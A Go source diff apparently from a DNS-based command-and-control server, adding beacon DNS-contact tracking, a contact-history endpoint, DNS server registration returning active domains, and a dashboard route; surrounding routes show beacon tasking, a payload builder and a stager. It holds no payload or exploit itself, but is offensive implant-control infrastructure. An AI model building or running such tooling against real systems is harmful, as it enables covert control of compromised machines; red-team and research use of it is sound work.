@@ -958,6 +958,30 @@ func (api *APIServer) handleBeaconReport(w http.ResponseWriter, r *http.Request)
 		return
 	}
 
+	// Record that this beacon contacted this DNS server
+	// Get the DNS domain for this server
+	servers, err := api.db.GetDNSServers()
+	dnsDomain := "unknown"
+	if err == nil {
+		for _, server := range servers {
+			if serverID, ok := server["id"].(string); ok && serverID == dnsServerID {
+				if domain, ok := server["domain"].(string); ok {
+					dnsDomain = domain
+					break
+				}
+			}
+		}
+	}
+
+	// Track beacon DNS contact (async, don't fail the response if this errors)
+	go func(beaconID, serverID, domain string) {
+		if err := api.db.RecordBeaconDNSContact(beaconID, serverID, domain); err != nil {
+			if api.config.Debug {
+				fmt.Printf("[API] ⚠️  Failed to record beacon DNS contact: %v\n", err)
+			}
+		}
+	}(req.Beacon.ID, dnsServerID, dnsDomain)
+
 	if api.config.Debug {
 		fmt.Printf("[API] ✅ Beacon %s stored successfully from DNS server %s\n",
 			req.Beacon.ID, dnsServerID)
@@ -1035,6 +1059,24 @@ func (api *APIServer) handleGetBeacon(w http.ResponseWriter, r *http.Request) {
 	}
 
 	api.sendJSON(w, beacon)
+}
+
+// handleGetBeaconDNSContacts returns DNS contact history for a beacon
+func (api *APIServer) handleGetBeaconDNSContacts(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	beaconID := vars["id"]
+
+	if api.config.Debug {
+		fmt.Printf("[API] Beacon DNS contacts requested: %s\n", beaconID)
+	}
+
+	contacts, err := api.db.GetBeaconDNSContacts(beaconID)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve DNS contacts")
+		return
+	}
+
+	api.sendJSON(w, contacts)
 }
 
 // Task Management Endpoints
@@ -1236,6 +1278,71 @@ func (api *APIServer) handleGetBeaconsForDNSServer(w http.ResponseWriter, r *htt
 	}
 
 	api.sendJSON(w, beacons)
+}
+
+// handleDNSServerRegistration handles DNS server registration/heartbeat
+// Returns the list of all active DNS domains for the server to use
+func (api *APIServer) handleDNSServerRegistration(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		ServerID string `json:"server_id"`
+		Domain   string `json:"domain"`
+		Address  string `json:"address"`
+		APIKey   string `json:"api_key"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	// Validate required fields
+	if req.ServerID == "" || req.Domain == "" || req.APIKey == "" {
+		api.sendError(w, http.StatusBadRequest, "missing required fields: server_id, domain, api_key")
+		return
+	}
+
+	// Verify API key matches
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+	if dnsServerID != req.ServerID {
+		api.sendError(w, http.StatusUnauthorized, "server_id mismatch")
+		return
+	}
+
+	// Update or insert DNS server record
+	err := api.db.RegisterDNSServer(req.ServerID, req.Domain, req.Address, req.APIKey)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to register DNS server")
+		if api.config.Debug {
+			fmt.Printf("[API] DNS server registration error: %v\n", err)
+		}
+		return
+	}
+
+	// Get all active DNS domains to return
+	servers, err := api.db.GetActiveDNSServers()
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve DNS servers")
+		return
+	}
+
+	// Extract domain list
+	domains := make([]string, 0, len(servers))
+	for _, server := range servers {
+		if domain, ok := server["domain"].(string); ok && domain != "" {
+			domains = append(domains, domain)
+		}
+	}
+
+	if api.config.Debug {
+		fmt.Printf("[API] DNS server registered: %s (%s) - returning %d active domains\n",
+			req.ServerID, req.Domain, len(domains))
+	}
+
+	api.sendSuccess(w, "DNS server registered", map[string]interface{}{
+		"server_id": req.ServerID,
+		"domain":    req.Domain,
+		"domains":   domains,
+	})
 }
 
 // handleGetTaskStatusesForDNSServer returns completed/failed task statuses for DNS servers
@@ -1950,6 +2057,7 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	router.HandleFunc("/login", api.handleLoginPage).Methods("GET")
 	router.HandleFunc("/dashboard", api.handleDashboardPage).Methods("GET")
 	router.HandleFunc("/beacon", api.handleBeaconPage).Methods("GET")
+	router.HandleFunc("/dns-servers", api.handleDNSServersPage).Methods("GET")
 	router.HandleFunc("/builder", api.handleBuilderPage).Methods("GET")
 	router.HandleFunc("/stager", api.handleStagerPage).Methods("GET")
 	router.HandleFunc("/users", api.handleUsersPage).Methods("GET")
@@ -1983,6 +2091,7 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	operatorRouter.HandleFunc("/dns-servers", api.handleListDNSServers).Methods("GET")
 	operatorRouter.HandleFunc("/beacons", api.handleListBeacons).Methods("GET")
 	operatorRouter.HandleFunc("/beacons/{id}", api.handleGetBeacon).Methods("GET")
+	operatorRouter.HandleFunc("/beacons/{id}/dns-contacts", api.handleGetBeaconDNSContacts).Methods("GET")
 	operatorRouter.HandleFunc("/beacons/{id}", api.handleDeleteBeacon).Methods("DELETE")
 	operatorRouter.HandleFunc("/beacons/{id}/task", api.handleCreateTask).Methods("POST")
 	operatorRouter.HandleFunc("/tasks", api.handleListTasks).Methods("GET")
@@ -2010,6 +2119,7 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	dnsRouter.Use(api.rateLimitMiddleware(api.dnsLimiter))
 	dnsRouter.Use(api.dnsServerAuthMiddleware)
 
+	dnsRouter.HandleFunc("/register", api.handleDNSServerRegistration).Methods("POST")
 	dnsRouter.HandleFunc("/checkin", api.handleDNSServerCheckin).Methods("POST")
 	dnsRouter.HandleFunc("/beacon", api.handleBeaconReport).Methods("POST")
 	dnsRouter.HandleFunc("/result", api.handleSubmitResult).Methods("POST")
@@ -2047,6 +2157,10 @@ func (api *APIServer) handleDashboardPage(w http.ResponseWriter, r *http.Request
 
 func (api *APIServer) handleBeaconPage(w http.ResponseWriter, r *http.Request) {
 	http.ServeFile(w, r, filepath.Join(api.config.WebRoot, "beacon.html"))
+}
+
+func (api *APIServer) handleDNSServersPage(w http.ResponseWriter, r *http.Request) {
+	http.ServeFile(w, r, filepath.Join(api.config.WebRoot, "dns-servers.html"))
 }
 
 func (api *APIServer) handleUsersPage(w http.ResponseWriter, r *http.Request) {
